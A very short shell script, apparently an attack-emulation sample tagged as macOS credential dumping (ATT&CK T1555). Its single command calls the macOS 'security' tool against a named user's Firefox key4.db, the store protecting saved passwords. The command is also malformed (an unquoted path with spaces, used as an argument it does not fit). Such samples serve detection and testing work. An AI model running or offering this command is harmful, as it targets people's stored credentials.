#!/usr/bin/env sh
# ATTACK_CREDENTIAL_DUMP_T1555_MACOS_SECURITY_FIND
security find-generic-password /Users/siddartha/Library/Application Support/Firefox/Profiles/g728f7te.default-release/key4.db
